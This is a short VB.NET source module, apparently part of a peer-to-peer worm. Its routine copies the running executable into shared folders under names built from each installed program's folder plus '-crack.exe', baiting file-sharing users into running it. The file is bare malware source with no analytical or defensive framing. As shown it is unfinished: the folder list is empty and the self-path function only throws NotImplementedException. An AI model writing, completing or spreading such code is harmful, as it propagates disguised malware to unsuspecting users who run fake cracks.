Imports System.IO

Module P22P
    Public Sub p2p()
        Dim arSharedFolders As New ArrayList()

       
        Dim folder As IEnumerator = arSharedFolders.GetEnumerator()
        While folder.MoveNext()
            Dim tada As String = Convert.ToString(folder.Current)
            If Directory.Exists(tada) Then
                Dim progDir As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
                For Each d As String In Directory.GetDirectories(progDir)
                    Dim app As String = (tada & "\") + d.Substring(d.LastIndexOf("\")).Replace("\", String.Empty) & "-crack.exe"
                    File.Copy([me], app, True)
                Next
            End If
        End While
    End Sub

    Private Function [me]() As String
        Throw New NotImplementedException
    End Function

End Module